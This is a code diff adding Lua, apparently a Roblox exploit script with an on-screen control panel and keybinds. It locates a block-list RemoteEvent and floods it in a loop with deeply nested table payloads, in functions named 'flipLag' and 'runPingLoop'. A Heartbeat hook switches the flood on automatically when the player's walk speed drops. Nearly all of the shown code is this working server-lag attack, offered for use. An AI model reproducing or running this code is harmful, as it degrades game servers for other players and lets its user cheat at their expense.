@@ -1,0 +1,132 @@
+		listeningFor = nil
+		updateKbLabels()
+		tw(settingsFrame, {Size=UDim2.new(0, SET_W, 0, 0)}, 0.16)
+		task.delay(0.18, function() settingsFrame.Visible = false end)
+		tw(settingsBtn, {TextColor3=C.dim}, 0.12)
+	end
+end
+settingsBtn.MouseButton1Click:Connect(toggleSettings)
+setCloseBtn.MouseButton1Click:Connect(toggleSettings)
+local function findRemote()
+	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+	if not rrs then return nil end
+	local rem
+	for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+		local r = rrs:FindFirstChild(name)
+		if r and r:IsA("RemoteEvent") then rem = r break end
+	end
+	if not rem then
+		for _, c in ipairs(rrs:GetChildren()) do
+			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
+		end
+	end
+	return rem
+end
+remote = findRemote()
+local function buildPayload(power)
+	local main = {}
+	local nested = {{}}
+	local current = nested[1]
+	for _ = 1, 186 do
+		local n = {}
+		table.insert(current, n)
+		current = n
+	end
+	local maxRep = math.min(math.floor(power / 188), 10000)
+	for _ = 1, maxRep do
+		table.insert(main, nested)
+	end
+	return main
+end
+local function runPingLoop()
+	local delay = cfg.interval
+	while active and remote do
+		local payload = buildPayload(cfg.power)
+		local ok = pcall(function() remote:FireServer(payload) end)
+		if not ok then
+			delay = math.min(delay * 1.5, 0.5)
+		else
+			delay = math.max(delay * 0.995, 0.05)
+		end
+		task.wait(delay)
+	end
+end
+local function flipLag(state, isManual)
+	active = state
+	if isManual then
+		if brainrotMode then manualOverride = not state else manualOverride = false end
+	end
+	if active then
+		if not remote then remote = findRemote() end
+		if not remote then active = false; flipLag(false); return end
+		activateBtn.Text = "ACTIVATED"
+		activateBtn.TextColor3 = C.white
+		activateFrameStroke.Color = C.green1
+		statusLbl.Text = "ACTIVE"
+		statusLbl.TextColor3 = C.white
+		statusPill.BackgroundColor3 = C.green2
+		statusStroke.Color = C.white
+		task.spawn(runPingLoop)
+	else
+		activateBtn.Text = "ACTIVATE"
+		activateBtn.TextColor3 = C.green1
+		activateFrameStroke.Color = Color3.fromRGB(20, 40, 20)
+		statusLbl.Text = "READY"
+		statusLbl.TextColor3 = C.green1
+		statusPill.BackgroundColor3 = Color3.fromRGB(5, 30, 10)
+		statusStroke.Color = C.green1
+	end
+end
+activateBtn.MouseButton1Click:Connect(function() flipLag(not active, true) end)
+RunService.Heartbeat:Connect(function()
+	if not cfg.autoBrainrot then
+		if brainrotMode then brainrotMode = false; lastBrainrotState = false end
+		return
+	end
+	local char = plr.Character
+	if not char then return end
+	local hum = char:FindFirstChild("Humanoid")
+	if not hum then return end
+	local hasBrainrot = hum.WalkSpeed < 25
+	if hasBrainrot and not lastBrainrotState then
+		brainrotMode = true
+		lastBrainrotState = true
+		manualOverride = false
+		flipLag(true)
+	elseif not hasBrainrot and lastBrainrotState then
+		brainrotMode = false
+		lastBrainrotState = false
+		manualOverride = false
+		flipLag(false)
+	end
+end)
+UserInputService.InputBegan:Connect(function(input, processed)
+	local kc = input.KeyCode
+	if kc == Enum.KeyCode.Unknown then return end
+	local isGp = isGamepad(kc)
+	local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+	if listeningFor then
+		if kc == Enum.KeyCode.Escape then listeningFor = nil; updateKbLabels(); return end
+		if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+			cfg.keybindKb = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig()
+			return
+		end
+		if listeningFor == "gp" and isGp then
+			cfg.keybindGp = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig()
+			return
+		end
+		return
+	end
+	if processed then return end
+	if kc == Enum.KeyCode.RightControl then
+		mainFrame.Visible = not mainFrame.Visible
+		if not mainFrame.Visible and settingsOpen then toggleSettings() end
+		return
+	end
+	local kbEnum = resolveKb(cfg.keybindKb)
+	local gpEnum = resolveKb(cfg.keybindGp)
+	if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
+		flipLag(not active, true)
+	end
+end)
+updateKbLabels()
